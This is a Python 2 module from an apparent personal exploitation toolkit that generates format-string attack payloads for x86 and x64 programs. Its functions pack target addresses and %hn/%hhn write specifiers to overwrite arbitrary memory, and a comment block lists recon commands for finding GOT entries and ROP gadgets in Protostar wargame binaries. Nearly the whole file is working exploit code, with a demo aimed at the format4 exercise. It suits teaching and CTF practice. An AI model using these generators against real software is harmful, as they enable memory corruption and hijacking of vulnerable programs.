#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from mypwn.mymath import *
from mypwn.log import *

__all__ = [
    'pad',
    'fmt_four_bytes',
    'fmt_two_shorts',
    'fmt_x64',
  ]

'''
# to find function in GOT table
objdump -TR /opt/protostar/bin/format4 |grep exit
# to find symbol
nm /opt/protostar/bin/format4 |grep target
# get exported function in libc
nm -D --defined-only libc.so.6 |grep fgets
readelf -s libc |grep fgets
# search ROP gadgets
gdb-peda$ asmsearch "pop ? ; ret"

'''

_warning_type = {
  "\x00": "NULL byte detected !!!",
  "\x0d": "CR byte detected !!!",
  "\x0a": "LF byte detected !!!",
  "\x20": "SPACE detected !!!",
}

def pad(s, size=1024):
  assert len(s) <= size
  return s + 'X'*(size - len(s))

def _check_dangerous_chars(s):
  for ch, warning in _warning_type.iteritems():
    if ch in s:
      log.warn(warning)

_SIZE_FORMAT_CODE = '%%%dc'
_WRITE_TWO_SHORTS_FMT = '%%%d$hn'
_WRITE_FOUR_BYTES_FMT = '%%%d$hhn'

def fmt_four_bytes(dst, pos, src, length = 0):
  """
  Returns a string to exploit format string vulnerable on x86 architecture.

  Args:
    dst    (int) -- address of fmt strings in printf, sprintf ...
    pos    (int) -- position on the stack of the `dest', 0 < pos < 100
    src    (int) -- what you want to write to dest
    length (int) -- len of written chars before our format string in printf

  Returns:
    (str) The exploit for format string vulnerable.

  """
  if length < 0:
    raise ValueError("length cannot < 0")

  BORROW_VALUE = 0x100
  #[addr][addr+1][addr+2][addr+3] =
  #     '[\x90\x97\x04\x08][\x91\x97\x04\x08]
  #      [\x92\x97\x04\x08][\x93\x97\x04\x08]'
  LEN_ADDR = 4 * 4

  payload = ''
  for x in xrange(4):
    payload += p32(dst + x)
  # we have written LEN_ADDR bytes so far to stdout (printf) or
  # string buffer (sprintf or snprintf)
  bytesArr = [
       src        & 0xff,
      (src >> 8)  & 0xff,
      (src >> 16) & 0xff,
      (src >> 24) & 0xff
    ]
  sizes = []
  sizes.append(bytesArr[0] - LEN_ADDR - length)
  sizes.append(bytesArr[1] - bytesArr[0])
  sizes.append(bytesArr[2] - bytesArr[1])
  sizes.append(bytesArr[3] - bytesArr[2])

  for x in xrange(4):
    if sizes[x] < 0:
      sizes[x] = BORROW_VALUE + sizes[x]

    if sizes[x] > 0:
      payload += _SIZE_FORMAT_CODE % (sizes[x])
    payload += _WRITE_FOUR_BYTES_FMT % (pos + x)

  _check_dangerous_chars(payload)
  return payload


def fmt_two_shorts(dst, pos, src, length = 0):
  """
  Returns a string to exploit format string vulnerable on x86 architecture.

  Args:
    dst    (int) -- address of fmt strings in printf, sprintf ...
    pos    (int) -- position on the stack of the `dest', 0 < pos < 100
    src    (int) -- what you want to write to dest
    length (int) -- len of written chars before our format string in printf

  Returns:
    (str) The exploit for format string vulnerable.

  """
  if length < 0:
    raise ValueError("length cannot < 0")
  SHORT_SIZE = 2
  BORROW_VALUE = 0x10000
  #[addr][addr+2] = '[\x90\x97\x04\x08][\x92\x97\x04\x08]'
  LEN_ADDR = 4 * 2

  payload = ''
  payload += p32(dst)
  payload += p32(dst + SHORT_SIZE)
  # we have written LEN_ADDR bytes so far to stdout (printf) or
  # string buffer (sprintf or snprintf)
  words = [
       src        & 0xffff,
      (src >> 16) & 0xffff
    ]
  sizes = []
  sizes.append(words[0] - LEN_ADDR - length)
  sizes.append(words[1] - words[0])

  for x in xrange(2):
    if sizes[x] < 0:
      sizes[x] = BORROW_VALUE + sizes[x]

    if sizes[x] > 0:
      payload += _SIZE_FORMAT_CODE % (sizes[x])
    payload += _WRITE_TWO_SHORTS_FMT % (pos + x)

  _check_dangerous_chars(payload)
  return payload


def fmt_x64(dst, pos, src, length = 0):
  """
  Returns a string to exploit format string on x64 architecture.

  Args:
    dst    (int) -- address of fmt strings in printf, sprintf ...
    pos    (int) -- position on the stack of the `dest', 0 < pos < 100
    src    (int) -- what you want to write to dest
    length (int) -- len of written chars before our format string in printf

  Returns:
    (str) The exploit for format string vulnerable.

  Example:
    fmtQuadword(dst=0x601250, pos=8, src=0x601230, length=18)
    -> '%4638c%8hn%48c%9hhn0x601250'

    longest format string (pos=94):
      25 <- '%65535c%98$hn%255c%99$hhn'
    shortest format string (pos=1):
      11 <- '%1$hn%2$hhn'
    So we pad in 32 bytes

  """
  PADSIZE = 32
  WORD_IN_X64 = 8
  OFFSET = PADSIZE // WORD_IN_X64
  if length < 0:
    raise ValueError("length cannot < 0")
  # use %llx to debug
  if pos < 1 or pos > (99 - OFFSET):
    log.warn('Warning: pos may overflow this function')


  lower_word = src & 0xffff
  uppper_word = (src >> 16) & 0xff

  lower_size = lower_word - length
  upper_size = uppper_word - lower_word
  if lower_size < 0: # for hn format
    lower_size += 0x10000
  if upper_size < 0:
    upper_size = upper_size % 0x100


  fmt = '' # sized fmt string, e.x. '%12345c'
  if lower_size > 0:
    fmt += _SIZE_FORMAT_CODE % lower_size
  fmt += _WRITE_TWO_SHORTS_FMT % (pos + OFFSET)

  if upper_size > 0:
    fmt += _SIZE_FORMAT_CODE % upper_size
  fmt += _WRITE_FOUR_BYTES_FMT % (pos + OFFSET + 1)

  payload = ''
  payload += fmt + 'A' * (PADSIZE - len(fmt))
  payload += p64(dst)
  payload += p64(dst + 2)

  _check_dangerous_chars(payload)
  return payload


def _main():
  target = 0x08049794
  position = 4
  src = 0xcafebabe
  if len(sys.argv) > 1:
    position = int(sys.argv[1])
    s = 'custom'
  else:
    s = "default"

  msg = "Target: 0x%x with %s position on stack: %d and src: 0x%x" % (target, s, position, src)
  log.info(msg)
  log.info("Our exploit string is:")
  sys.stderr.write(fmt_four_bytes(target, position, src))
  sys.stderr.write(fmt_two_shorts(target, position, src))


if __name__ == "__main__":
  _main()
